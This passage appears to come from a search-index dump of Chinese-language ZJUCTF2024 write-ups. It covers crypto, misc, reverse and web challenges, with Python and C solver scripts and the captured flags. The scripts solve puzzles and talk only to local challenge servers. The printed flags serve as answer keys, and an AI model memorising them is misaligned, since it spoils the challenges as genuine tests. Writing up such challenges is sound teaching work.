\u770b\u4f5c\u4e8c\u8fdb\u5236\u7f16\u7801\uff0c\u5206\u522b\u7528\u8be5\u9012\u63a8\u516c\u5f0f\u6c42\u7684 2 \u7684\u5e42\u500d\u7684 a\uff0c\u7136\u540e\u4f7f\u7528 part1 \u76f8\u52a0</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/#part3","title":"part3","text":"<p>\u5176\u4e2d \\((-1)^n\\) \u7528\u4e0b\u9762\u7684\u516c\u5f0f\u83b7\u5f97\uff1a</p> <p></p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/#_1","title":"\u4ee3\u7801\uff1a","text":"<p>\u4ea4\u4e92\u4ee3\u7801\uff1a</p> fib1.py<pre><code>import re\nfrom pwn import *\nfrom fib1_func import fib_plus, fib_multi, fib_minus\n\n\ndef extract_info(data):\n    p = int(re.search(r\"p = (\\d+)\", data).group(1))\n    k = int(re.search(r\"k = (\\d+)\", data).group(1))\n    fib_a = tuple(map(int, re.search(r\"fib\\(a, p\\) = \\((\\d+), (\\d+)\\)\", data).groups()))\n    fib_b = tuple(map(int, re.search(r\"fib\\(b, p\\) = \\((\\d+), (\\d+)\\)\", data).groups()))\n    return p, k, fib_a, fib_b\n\n\ndef getAns(res, p):\n    return res[0] * p + res[1]\n\n\ncontext.log_level = \"debug\"\ncon = connect(\"127.0.0.1\", 57033)\nfor _ in range(10):\n    data = con.recvuntil(b\"fib(a + b, p) =\").decode()\n    p, k, fib_a, fib_b = extract_info(data)\n\n    # part 1\n    res = fib_plus(fib_a, fib_b, p)\n    ans = getAns(res, p)\n    con.sendline(str(ans).encode())\n\n    # part 2\n    data = con.recvuntil(b\"fib(k * a, p) =\").decode()\n    res = fib_multi(k, fib_a[0], fib_a[1], p)\n    ans = getAns(res, p)\n    con.sendline(str(ans).encode())\n\n    # part 3\n    data = con.recvuntil(b\"if fib(a + c, p) = (0, 1), fib(c, p) = \").decode()\n    # extract fib(a+c, p)\n    fib_apc = tuple(\n        map(int, re.search(r\"fib\\(a \\+ c, p\\) = \\((\\d+), (\\d+)\\)\", data).groups())\n    )\n    fib_c = fib_minus(fib_apc, fib_a, p)\n    # fib_c = fib_a\n    ans = getAns(fib_c, p)\n    con.sendline(str(ans).encode())\ncon.recvall()\ncon.close()\n</code></pre> <p>\u51fd\u6570\u4ee3\u7801\uff1a</p> fib1_func.py<pre><code># part 1\ndef fib_plus(fib_a, fib_b, p):\n    fa, fap1 = fib_a\n    fb, fbp1 = fib_b\n    # fapb = fa*fbp1 + fam1*fb\n    fam1 = fap1 - fa\n    fapb = (fa * fbp1 + fam1 * fb) % p\n    # fap1pb = fap1*fbp1 + fa*fb\n    fapbp1 = (fap1 * fbp1 + fa * fb) % p\n\n    return fapb, fapbp1\n\n\n# part 2\nimport sys\nsys.setrecursionlimit(1500)  # \u5c06\u9012\u5f52\u6df1\u5ea6\u9650\u5236\u8bbe\u7f6e\u4e3a 1500\n\ndef fib_2power(n, fa, fap1, p):\n    if n == 1:\n        return fa, fap1\n    # print(n)\n    c, d = fib_2power(n &gt;&gt; 1, fa, fap1, p)\n\n    c2 = (c * (2 * d - c)) % p\n    d2 = (c * c + d * d) % p\n\n    if n &amp; 1:\n        return d2, (c2 + d2) % p\n    else:\n        return c2, d2\n\n\ndef fib_multi(k, fa, fap1, p):\n    from math import log2\n\n    # \u5c06 k \u8f6c\u4e3a 2 \u8fdb\u5236\u6570\uff0c\u5e76\u5206\u522b\u6c42 fib_2power(k) \u7684\u503c\uff0c\u4f7f\u7528 fib_plus() \u5408\u5e76\n    k_bin = bin(k)[2:][::-1]\n    k_len = len(k_bin)\n    res = (0, 1)\n    for i in range(k_len):\n        if k_bin[i] == \"1\":\n            res = fib_plus(res, fib_2power(2**i, fa, fap1, p), p)\n    return res\n\n\n# Part 3\ndef fib_minus(fib_a, fib_b, p):\n    fa, fap1 = fib_a\n    fb, fbp1 = fib_b\n    fam1 = fap1 - fa\n    fbm1 = fbp1 - fb\n    factor = fbp1 * fbm1 - fb * fb\n    famb = (factor * (fa * fbm1 - fam1 * fb)) % p\n    fambp1 = (factor * (fap1 * fbm1 - fa * fb)) % p\n\n    return famb, fambp1\n</code></pre> <p></p> <p>Flag</p> <p>ZJUCTF{fibonacci_sequence_mod_n_is_a_kind_of_group}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/#ezxor","title":"ezxor","text":"<p>\u82e5\u660e\u6587\u6bd4\u7279\u4e3a \\(x_{0}x_{1}x_{2}x_{3}\\dots\\) \u7ffb\u8f6c\u524d\u7684 cipher \u6bd4\u7279\u4e3a \\(y_{0}y_{1}y_{2}y_{3}\\dots\\) \uff0c\u90a3\u4e48\u7531\u4e8e\u5f02\u6216\u7684\u4ea4\u66ff\u6027\uff0c\u6709 \\(x_{i}=y_{i-1} \\oplus y_{i} (1\\leq i&lt;len(cipher))\\) \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u9760 cipher \u5f88\u5feb\u89e3\u51fa\u660e\u6587\uff1b</p> ezxor_solver.py<pre><code>ciphertext = \"01100...01010110\"\n\n# print(bin(ord(\"R\"))[2:].zfill(8)) # 01010010\nplaintext_bin = \"0\"\nfor i in range(len(ciphertext) - 1):\n    plaintext_bin += str(int(ciphertext[i]) ^ int(ciphertext[i + 1]))\n\n# 8bits \u4e00\u7ec4\uff0c\u8f6c\u6362\u4e3a\u5b57\u7b26\nplaintext = \"\"\nfor i in range(0, len(plaintext_bin), 8):\n    plaintext += chr(int(plaintext_bin[i : i + 8], 2))\n\nprint(plaintext)\n# Romn{e!\u00e9^ the mundane worl\u00a4     slike a starqy sky admired\u00e0from a&amp;bustling city.[\u00caUCF{Tell_do&gt;e!_Wel\u00a3\u00afme_to_YJUCTF_2&lt;24!}\n\n# ZJUCTF{Well_done!_Welcome_to_ZJUCTF_2024!}\n</code></pre> <p>\u7ffb\u8f6c\u4e86\u600e\u4e48\u529e\uff1f\u731c\u5427\uff0c\u4e00\u731c\u4e00\u4e2a\u51c6\uff1a</p> <p>Flag</p> <p>ZJUCTF{Well_done!_Welcome_to_ZJUCTF_2024!}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/#shad0wtime","title":"shad0wtime","text":"<p>\u7d27\u5f20\u523a\u6fc0\u7684\u62fc\u624b\u901f\u73af\u8282</p> shad0wtime_solver.py<pre><code>from pwn import *\n\ncontext.log_level = \"debug\"\nconn = remote(\"localhost\", 59279)\nconn.recvuntil(b\"Enter your option: \")\nconn.sendline(b\"sign_time\")\n\nsignature_data = conn.recvuntil(b\"Enter your option: \").decode()\nsignature_dict = eval(signature_data.split(\"\\n\")[0])\n\n\nmsg = signature_dict[\"msg\"]\nr = signature_dict[\"r\"]\ns = signature_dict[\"s\"]\n\nconn.sendline(b\"verify\")\n\nconn.sendline(msg.encode())\nconn.sendline(r[2:].encode())  # \u53bb\u6389'0x'\u524d\u7f00\nconn.sendline(s[2:].encode())  # \u53bb\u6389'0x'\u524d\u7f00\n\nresult = conn.recvall().decode()\nprint(result)\n\nconn.close()\n</code></pre> <p></p> <p>Flag</p> <p>ZJUCTF{w31l_you_a!re4d7_kn0w_T0__name__[[vaRIabLes]]_properly}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/MISC/","title":"MISC","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/MISC/#_1","title":"\u9505\u91cc\u635e\u9762","text":"<p>\u81f4\u656c\u4f20\u5947\u7535\u62a5\u5458\uff1a</p> <pre><code>.- -.-- -- -.-. .. -.- --.- -..- .... .-. ...-- ..--- ----- . --... -.-. .... .-- ...- -.-- ---.. ....- --.. --. -- ----. ..... ....- ..- --. ----- -.... .---- .... ----. --.- ...- ----. ...-- -.... ----- - .--- - .--- .--- ...-- --... .... ----. .- -... .-.. ....- ..--- .- -... .--- .... ..... -... -...\n</code></pre> <p>\u83ab\u65af\u89e3\u7801\u4e3a <code>AYMCIKQXHR320E7CHWVY84ZGM954UG061H9QV9360TJTJJ37H9ABL42ABJH5BB</code></p> <p>\u7136\u540e\u5462\uff1f\u5e38\u89c1\u89e3\u7801\u65e0\u6cd5\u89e3\u51fa\uff08\u53ef\u80fd\u662f\u7f3a\u5c11\u4e86\u4e00\u90e8\u5206\uff09\u3002</p> <p>\u518d\u770b\u89c6\u9891\u672c\u8eab\uff0c\u76ef\u5e27\u53ef\u4ee5\u53d1\u73b0\u6709\u767d\u7ebf\u6216\u8005\u9ed1\u7ebf\u95ea\u8fc7\u3002\u7ed3\u5408\u9898\u76ee\u7684\u63d0\u793a\uff0c\u4ee3\u7801 128\uff0c\u67e5\u8be2\u5230\u5e94\u8be5\u662f code 128 \uff0c\u4e8e\u662f\u731c\u60f3\u5e94\u8be5\u662f\u8981\u5c06\u7ebf\u6761\u63d0\u53d6\u51fa\u6765\uff0c\u62fc\u51d1\u6210\u4e00\u4e2a\u6761\u5f62\u7801\uff1b\u4f46\u662f python \u6c34\u5e73\u4e0d\u8fc7\u5173\uff0c\u5355\u662f\u63d0\u53d6\u51fa\u6765\u53ea\u89c9\u5f97\u662f\u6bd4\u8f83\u524d\u540e\u4e24\u5e27\uff0c\u5dee\u522b\u5f88\u5927\u5c31\u63d0\u53d6\uff0c\u66f4\u522b\u8bf4\u628a\u5dee\u5f02\u5904\u63d0\u53d6\u51fa\u6765\u4e86\u3002</p> <p>\u53c2\u89c1 https://note.gopoux.cc/ctf/writeups/zjuctf2024/_1</p> <p>\u624b\u52a8\u89e3\u7801\u5c31\u662f\u5f88\u5bb9\u4ee5\u9519\uff08\u4e0d\u8fc7\u4f3c\u4e4e\u53ea\u6709\u7b2c\u4e09\u4e2a\u5b57\u7b26\u9519\u8bef\uff09\uff0c\u5c24\u5176\u662f\u5f53\u53ea\u6709 <code>-</code> \u6216\u8005 <code>.</code> \u65f6\u53c8\u6ca1\u6ce8\u610f\u6301\u7eed\u65f6\u957f\uff0c\u5bb9\u6613\u641e\u6df7\uff1b\u4f7f\u7528\u811a\u672c\uff0c\u6b63\u786e\u83ab\u65af\u89e3\u7801\u540e\u5185\u5bb9\u5982\u4e0b</p> wave2morse.py<pre><code>import wave\nimport numpy as np\nimport itertools\nfrom moviepy.editor import VideoFileClip\n\n\ndef compress(L, v):\n    # Convert signal to binary based on threshold v\n    values = [int(i &gt; v) for i in L]\n    # Group consecutive values and count their lengths\n    return [\n        (k, len(list(g)))\n        for k, g in itertools.groupby(range(len(values)), values.__getitem__)\n    ]\n\n\ndef decompress(L):\n    # Reconstruct signal from compressed format\n    return [L[i][0] for i in range(len(L)) for _ in range(L[i][1])]\n\n\n# Extract audio from video file\nvideo = VideoFileClip(\"128.mp4\")\nvideo.audio.write_audiofile(\"output.wav\")\nvideo.close()\n\n# Open and read WAV file\naudio = wave.open(\"output.wav\", \"rb\")\nparams = audio.getparams()\nprint(\"Audio parameters:\", params)\nnchannels, _, samplerate, nframes = params[:4]\n\n# Read audio samples\nsamples = audio.readframes(nframes)\naudio.close()\n\n# Convert to numpy array and get absolute values\nsamples = np.abs(np.frombuffer(samples, dtype=np.int16))\nprint(\"Raw samples:\", samples)\n\n# Noise reduction: replace zero values with local average\nfor i in range(15, len(samples) - 15):\n    if samples[i] == 0:\n        samples[i] = np.average(samples[i - 15 : i + 15])\n\nprint(\"Start compressing...\")\n# First compression: threshold at 10000\ncompressed = compress(samples, 10000)\n# Filter out short signals (noise)\ncompressed = [(k, v) for k, v in compressed if v &gt; 20]\n# Second compression after reconstruction\ncompressed = compress(decompress(compressed), 0)\n\n# Decode morse code\nfrom morseutils.translator import MorseCodeTranslator as mct\n\nL = compressed\nmorse = []\n\n# Convert signal patterns to morse code\nfor i in range(len(L)):\n    if L[i][0] == 0 and L[i][1] &gt; 10000:\n        # Long silence indicates word space\n        morse.append(\" \")\n    elif L[i][0] == 1:\n        if L[i][1] &lt; 10000:\n            # Short signal is dot\n            morse.append(\".\")\n        else:\n            # Long signal is dash\n            morse.append(\"-\")\n\n# Clean up morse code and decode\nmorse_code = \"\".join(morse)[1:-1]\nprint(\"Morse code:\", morse_code)\nprint(\"Decoded message:\", mct.decode(morse_code))\n</code></pre> <p>\u6211\u5c1d\u8bd5\u8fd0\u884c\u4e86\u4e0b\uff0c\u65f6\u95f4\u592a\u957f Killed \u4e86\uff0c\u611f\u89c9\u624b\u52a8\u4e5f\u53ef\u4ee5\uff08\uff09\u3002</p> <p><code>AYICIKQXHR320E7CHW4Y84ZGM954UG061H9QV9X2360TJJ37H9ABL42ABJH5BB</code></p> <p>code 128 \u4e5f\u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f\u9898\u89e3\u4e2d\u63d0\u5230\u63d0\u53d6\u3001\u62fc\u51d1\u540e\u4efb\u7136\u65e0\u6cd5\u626b\u63cf\uff1b\u4f46\u662f\u5206\u6790\u5176\u6784\u6210\u731c\u6d4b\u662f\u53ea\u7ed9\u4e86\u6570\u636e\u533a\uff0c\u90a3\u4e48\u8981\u4e48\u624b\u52a8\u89e3\u7801\uff0c\u8981\u4e48\u81ea\u884c\u6dfb\u52a0\u7a7a\u767d\u533a\u57df\u7b49\u3002\u663e\u7136\u524d\u8005\u8981\u6c42\u66f4\u4f4e\uff0c\u6570\u636e\u533a\u3002</p> manual_code128.py<pre><code>import cv2\nimport numpy as np\nimport os\nimport itertools\n\ndef compress(L, v):\n    values = [int(i &lt; v) for i in L]\n    return [(k, len(list(g))) for k, g in itertools.groupby(range(len(values)), values.__getitem__)]\n\ndef slice(img):\n    \"\"\"\n    \u53ea\u63d0\u53d6\u4e00\u884c\uff0c\u907f\u514d AAA logo \u5f71\u54cd\n    \"\"\"\n    return img[75:75+10, 0:-1]\n\n# \u6253\u5f00\u89c6\u9891\u6587\u4ef6\ncap = cv2.VideoCapture('\u4ee3\u53f7128.mp4')\n\nL = np.zeros(256) # \u8bb0\u5f55\ncon = [] # \u7ec4\u5408\n\nwhile True:\n    ret, frame = cap.read()\n    if not ret:\n        break\n\n    gray_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n    slice0 = gray_frame[75, :]\n\n    for i in range(256):\n        if slice0[i] &lt; 50 or slice0[i] &gt; 200:\n            if L[i] != 0:\n                con = np.concatenate((con, L[29:227]))\n                L = np.zeros(256)\n            L[i] = slice0[i]\n\ncon = np.concatenate((con, L[29:227]))\ncon = compress(con, 128)\n\ncap.release()\n\n# code128 table\ncode128_t = { \"212222\": \" \", \"222122\": \"!\", \"222221\": '\"', \"121223\": \"#\", \"121322\": \"$\", \"131222\": \"%\", \"122213\": \"&amp;\", \"122312\": \"'\", \"132212\": \"(\", \"221213\": \")\", \"221312\": \"*\", \"231212\": \"+\", \"112232\": \",\", \"122132\": \"-\", \"122231\": \".\", \"113222\": \"/\", \"123122\": \"0\", \"123221\": \"1\", \"223211\": \"2\", \"221132\": \"3\", \"221231\": \"4\", \"213212\": \"5\", \"223112\": \"6\", \"312131\": \"7\", \"311222\": \"8\", \"321122\": \"9\", \"321221\": \":\", \"312212\": \";\", \"322112\": \"&lt;\", \"322211\": \"=\", \"212123\": \"&gt;\", \"212321\": \"?\", \"232121\": \"@\", \"111323\": \"A\", \"131123\": \"B\", \"131321\": \"C\", \"112313\": \"D\", \"132113\": \"E\", \"132311\": \"F\", \"211313\": \"G\", \"231113\": \"H\", \"231311\": \"I\", \"112133\": \"J\", \"112331\": \"K\", \"132131\": \"L\", \"113123\": \"M\", \"113321\": \"N\", \"133121\": \"O\", \"313121\": \"P\", \"211331\": \"Q\", \"231131\": \"R\", \"213113\": \"S\", \"213311\": \"T\", \"213131\": \"U\", \"311123\": \"V\", \"311321\": \"W\", \"331121\": \"X\", \"312113\": \"Y\", \"312311\": \"Z\", \"332111\": \"[\", \"314111\": \"\\\\\", \"221411\": \"]\", \"431111\": \"^\", \"111224\": \"_\", \"111422\": \"`\", \"121124\": \"a\", \"121421\": \"b\", \"141122\": \"c\", \"141221\": \"d\", \"112214\": \"e\", \"112412\": \"f\", \"122114\": \"g\", \"122411\": \"h\", \"142112\": \"i\", \"142211\": \"j\", \"241211\": \"k\", \"221114\": \"l\", \"413111\": \"m\", \"241112\": \"n\", \"134111\": \"o\", \"111242\": \"p\", \"121142\": \"q\", \"121241\": \"r\", \"114212\": \"s\", \"124112\": \"t\", \"124211\": \"u\", \"411212\": \"v\", \"421112\": \"w\", \"421211\": \"x\", \"212141\": \"y\", \"214121\": \"z\", \"412121\": \"{\", \"111143\": \"|\", \"111341\": \"}\", \"131141\": \"~\"}\n\nres = \"\"\n\nfor i in range(0, len(con), 6):\n    c = con[i : i + 6]\n    code = \"\"\n    for j in range(6):\n        code += str(c[j][1])\n        print(code, code128_t[code])\n        res += code128_t[code]\n\nprint(res)\n</code></pre> <p><code>BASE36ENCODETABLE:ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789</code></p> <p>\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 base36 \u89e3\u7801\uff0c\u7ec8\u4e8e\u6709\u4e2a\u4f1a\u5199\u7684 python \u4e86\uff1a</p> self_base.py<pre><code>base = 36\ncustom_base = \"ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789\"\n\ncipher_str = \"AYICIKQXHR320E7CHW4Y84ZGM954UG061H9QV9X2360TJJ37H9ABL42ABJH5BB\"\n\nassert len(custom_base) == base\n\n# print(\"len(cipher) =\", len(cipher))\ncipher_int = 0\nfor c in cipher_str:\n    cipher_int = cipher_int * base + custom_base.index(c)\n\nprint(\"cipher_int =\", hex(cipher_int))\n\nfrom Crypto.Util.number import long_to_bytes\n\nprint(long_to_bytes(cipher_int))\n</code></pre> <p>Flag</p> <p>ZJUCTF{A_13G3nd4Ry_4h0uR-T3l36r4Phls7XD}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/MISC/#bytes","title":"Bytes","text":"<p>16 \u8fdb\u5236 =&gt; \u8f6c bytes \u5373 8 \u4f4d\u4e8c\u8fdb\u5236 =&gt; \u5c1d\u8bd5\u62fc\u5404\u79cd\u89c4\u683c\u7684\u77e9\u5f62</p> bytes_solver.py<pre><code>tmp = [0x0, 0x0, ...] # bytes.txt \u4e2d\u7684\u5185\u5bb9\n\nflag_bin = \"\"\nfor t in tmp:\n    t_bin = bin(t)[2:].zfill(8)\n    flag_bin += t_bin\n\n# print(len(flag_bin)) # 6072 = 2^3 * 3 * 11 * 23\nfactors = [2, 2, 2, 3, 11, 23]\nfrom itertools import chain, combinations\n\n\ndef powerset(iterable):\n    \"\"\"\u751f\u6210\u53ef\u8fed\u4ee3\u5bf9\u8c61\u7684\u6240\u6709\u5b50\u96c6\"\"\"\n    s = list(iterable)\n    return chain.from_iterable(combinations(s, r) for r in range(len(s) + 1))\n\n\nxs = set()\nfor subset in powerset(factors):\n    product = 1\n    for num in subset:\n        product *= num\n    xs.add(product)\nxs = list(xs)\nxs.sort()\n\n# print(xs)\n\nflag = \"\"\n# for x in xs:\nfor x in [276]: # \u6839\u636e\u7ed3\u679c\u77e5\u9053\u662f 276\n    for i in range(len(flag_bin)):\n        if i % x == 0:\n            flag += \"\\n\"\n        flag += flag_bin[i]\n\nwith open(\"flag.txt\", \"w\") as f:\n    f.write(flag)\n</code></pre> <p></p> <p>Flag</p> <p>ZJUCTF{COU_GOU_LIANG_HANG_BA}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/MISC/#chess-encoding","title":"Chess Encoding","text":"<p>\u4f9d\u7167\u300a\u540d\u4fa6\u63a2\u67ef\u5357\u300b\u63d0\u793a\uff0c\u6211\u4eec\u5c06\u56fe\u7247\u90fd\u987a\u65f6\u9488\u65cb\u8f6c 90\u00b0\uff0c\u7531\u4e0b\u81f3\u4e0a\u8bfb\u53d6\u6570\u5b57\uff0c\u5747\u51cf\u4e00\u540e\u4e3a 8 \u8fdb\u5236\u6570\uff1b\u4e4b\u540e 8-&gt;2-&gt;16 -&gt; ASCII \u7801\uff0c</p> chess.py<pre><code>chess = [\n    \"37556236\",\n    \"31763217\",\n    \"47758624\",\n    \"42365648\",\n    \"42158664\",\n    \"42385648\",\n    \"33368663\",\n    \"46382635\",\n    \"38741628\",\n    \"46573648\",\n    \"44353572\",\n    \"26771627\",\n    \"26773622\",\n    \"38756571\",\n    \"34551267\",\n    \"38775268\",\n    \"45153648\",\n    \"36368635\",\n    \"34741286\",\n]\n\nchess = \"\".join(chess)\n\nchess_bin = \"\"\n# \u5bf9\u5e94\u5b57\u7b26\u51cf\u4e00\u540e\u53d8\u4e3a 8\u8fdb\u5236\u6570 \u8f6c\u53d8\u4e3a 3 \u4f4d\u4e8c\u8fdb\u5236\uff0c\u5e76\u5408\u5e76\nfor c in chess:\n    chess_bin += bin(int(c, 16) - 1)[2:].zfill(3)\n\n# \u4e8c\u8fdb\u5236\u8f6c\u6362\u4e3a\u5b57\u7b26\nflag = \"\"\nfor i in range(0, len(chess_bin), 8):\n    # print(i, int(chess_bin[i : i + 8], 2), chr(int(chess_bin[i : i + 8], 2)))\n    flag += chr(int(chess_bin[i : i + 8], 2))\n\nprint(flag)\n</code></pre> <p>Flag</p> <p>ZJUCTF{OKeY_dOkey_I_jusT_1Ove_mE17aN7eI_K0N@n_hopE_U_TO0}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/MISC/#master-of-c","title":"Master of C++","text":"<p>MasterC++ Chatgpt</p> <p>\u7f16\u8bd1\u540e\u7684\u00a0<code>main</code>\u00a0\u51fd\u6570\u5fc5\u987b\u53ea\u5305\u542b\u4e00\u6761\u64cd\u4f5c\u00a0<code>eax</code>\u00a0\u5bc4\u5b58\u5668\u7684\u6307\u4ee4\u548c\u4e00\u6761\u00a0<code>ret</code>\u00a0\u6307\u4ee4\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u4e0d\u80fd\u5728\u8fd0\u884c\u65f6\u8fdb\u884c\u4efb\u4f55\u8ba1\u7b97\uff0c\u6240\u6709\u7684\u5224\u65ad\u5fc5\u987b\u5728\u7f16\u8bd1\u65f6\u5b8c\u6210\uff0c\u4f7f\u7528\u6a21\u677f\u5143\u5b8c\u6210\u3002</p> <pre><code>template&lt;int N&gt;\nstruct prime {\n    static const bool value = (N &gt; 1) &amp;&amp; (N == 2 || N % 2 != 0) &amp;&amp;\n        (N &lt; 9 || (N % 3 != 0 &amp;&amp; N % 5 != 0 &amp;&amp; N % 7 != 0));\n};\n\nint main() {\n    return prime&lt;ARG&gt;::value ? 0 : 1;\n}\n</code></pre> <p></p> <p>Flag</p> <p>ZJUCTF{pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/MISC/#a","title":"\u5c0f A \u53e3\u7b97","text":"<p>\u65f6\u95f4\u5145\u8db3\uff0cpython \u4ea4\u4e92\u5c31\u597d:</p> alrithmetic<pre><code>from pwn import *\n\ncontext.log_level = \"debug\"\nconn = remote(\"127.0.0.1\", 52428)\n\n\n# Function to compare two numbers and return the appropriate symbol\ndef compare_numbers(a, b):\n    if a &gt; b:\n        return \"&gt;\"\n    elif a &lt; b:\n        return \"&lt;\"\n    else:\n        return \"=\"\n\n\n# Receive initial game introduction\nintro = conn.recvuntil(\"Input your choice:\")\n# print(intro.decode())\n\n# Send '1' as our choice for \"Primary school Bachelor\"\nconn.sendline(b\"1\")\n\n# Main loop\nwhile True:\n    try:\n        # Receive a chunk of data with a timeout\n        chunk = conn.recvuntil(\"input '&gt;', '&lt;' or '=' :\", timeout=5).decode()\n    except EOFError:\n        print(\"Connection closed by remote host\")\n        break\n    except TimeoutError:\n        print(\"Timeout while waiting for prompt. Receiving remaining data...\")\n        chunk = conn.recv().decode()\n\n    # Find the question in the chunk\n    lines = chunk.split(\"\\n\")\n    question = next((line for line in lines if \"?\" in line), None)\n\n    if not question:\n        print(\"No more questions. Remaining data:\")\n        print(chunk)\n        break\n\n    # print(f\"Question: {question}\")\n\n    # Parse the numbers from the question\n    numbers = question.split(\"?\")\n    a = int(numbers[0].strip())\n    b = int(numbers[1].strip())\n\n    # Compare the numbers and send the result\n    result = compare_numbers(a, b)\n    # print(f\"Sending: {result}\")\n    conn.sendline(result.encode())\n\n# Close the connection\nconn.close()\n</code></pre> <p></p> <p>Flag</p> <p>ZJUCTF{WoW_K1n6_0F_5h0-g4Ku-s31_4r1thm3t1c}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/REVERSE/","title":"REVERSE","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/REVERSE/#rev-beginner-1","title":"rev beginner 1","text":"<p>\u4f7f\u7528 IDA \u53cd\u6c47\u7f16\uff0c\u8bfb\u61c2 main \u51fd\u6570\u90e8\u5206\u5373\u53ef\uff1a</p> <p></p> input.py<pre><code>#   *(_DWORD *)&amp;v9[2] = 0x46574B5A;\n#   *(_DWORD *)&amp;v9[6] = 0x79814B58;\n#   *(_DWORD *)&amp;v9[10] = 0x74697F6D;\n#   *(_DWORD *)&amp;v9[14] = 0x84746C7F;\n#   *(_DWORD *)&amp;v9[18] = 0x7C84707E;\n#   *(_DWORD *)&amp;v9[22] = 0x568A7D7B;\n#   v9[26] = 0x95;\n\nv9 = [\n    0x00,\n    0x00,\n    0x5A,\n    0x4B,\n    0x57,\n    0x46,\n    0x58,\n    0x4B,\n    0x81,\n    0x79,\n    0x6D,\n    0x7F,\n    0x69,\n    0x74,\n    0x7F,\n    0x6C,\n    0x74,\n    0x84,\n    0x7E,\n    0x70,\n    0x84,\n    0x7C,\n    0x7B,\n    0x7D,\n    0x8A,\n    0x56,\n    0x95,\n]\n\nprint(len(v9))\n\nflag = \"\"\nfor i in range(25):\n    flag += chr(v9[i + 2] - i)\n\nprint(flag)\n</code></pre> <p>Flag</p> <p>ZJUCTF{rev_is_fun_right?}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/REVERSE/#rev-beginner-2","title":"rev beginner 2","text":"<p>\u5148\u5b66 Das \uff0c\u6b63\u5411\u7206\u7834\uff1a</p> rev2_solver.c<pre><code>// v12\nunsigned char p1[26] = {\n    0x3C,\n    0x1E,\n    //...\n    }\n// v14\nunsigned char p2[26] = {\n    0x75,\n    0x82,\n    //...\n    }\nunsigned char p3[26] = {\n    0x8D,\n    0xA8,\n    //...\n    }\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nvoid process_input(unsigned char* input) {\n    for (int i = 0; i &lt;= 25; ++i) {\n        unsigned char al = input[i] - (unsigned char)p1[i];\n        __asm__(\"das\" : \"+a\" (al));\n        input[i] = (unsigned char)p2[i] + al;\n    }\n}\n\nunsigned char das_simulate(unsigned char num, unsigned char al) {\n    unsigned char numl = num&amp;0x0f; // \u4f4e\u56db\u4f4d\n    unsigned char numh = num&amp;0xf0; // \u9ad8\u56db\u4f4d\n    unsigned char all = al&amp;0x0f;\n    unsigned char aih = al&amp;0xf0;\n    bool AF, CF;\n    AF = numl&lt;all;\n    CF = numh&lt;aih+AF;\n    unsigned char ret = (num-al);\n    unsigned char a = ret&amp;&amp;0xf;\n    unsigned char b = ret&amp;&amp;0xf0;\n    if (a&gt;9||AF) {\n        ret -= 6;\n    }\n    if (b&gt;144||CF) {\n        ret -= 0x60;\n    }\n    return ret;\n}\n\nint main() {\n    for (int i = 0; i &lt; 26; ++i)\n        for (int j = 33; j &lt; 128; ++j) {\n            unsigned char al = p3[i] - p2[i];\n            if ((das_simulate(j, p1[i]) == al) &amp;&amp; j&gt;=0x20 &amp;&amp; j&lt;=0x7d) {\n                printf(\"%c\", j);\n                break;\n            }\n        }\n}\n</code></pre> <p></p> <p>Flag</p> <p>ZJUCTF{welc0me-2-reverse!}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/WEB/","title":"WEB","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/WEB/#easy-pentest","title":"easy Pentest","text":"<p>Devvai \u7c97\u7565\u4e86\u89e3\u4e00\u4e0b OSS: \uff08\u5bf9\u8bdd\u4e0d\u516c\u5f00\uff09</p> <p>\u5b66\u5b66 oss \u7684\u8bbf\u95ee\uff1a</p> to_oss.py<pre><code>import oss2\n\naccess_key = \"xxxxxxxxxxx\"\nsecret_key = \"xxxxxxxxxxxxxx\"\nbucket_name = \"oss-test-qazxsw\"\nobject_key = \"fffffflllllaaaagggg.txt\"\nauth = oss2.Auth(access_key, secret_key)\nbucket = oss2.Bucket(auth, \"https://oss-cn-beijing.aliyuncs.com\", bucket_name)\n\n# \u83b7\u53d6\u6587\u4ef6\u5185\u5bb9\ntry:\n    content = bucket.get_object(object_key).read()\n    print(content.decode(\"utf-8\"))\nexcept Exception as e:\n    print(f\"error: {e}\")\n</code></pre> <p></p> <p>Flag</p> <p>flag{99b87fa89d7e147c42e709dcd378e03e}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/WELCOME/","title":"WELCOME","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/WELCOME/#_1","title":"\u5bb9\u5668\u8bf4\u660e","text":"<p>\u4f7f\u7528 websocket \u90e8\u7f72\uff0cnc \u8fde\u63a5\u5373\u53ef\uff1a</p> <p>Flag</p> <p>ZJUCTF{N0W_YOU_kN0w_h0W_TO_USe_tHE_C0nt4in3R}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/WELCOME/#_2","title":"\u7b7e\u5230\u9898","text":"<p>QQ+wechat</p> <p>Flag</p> 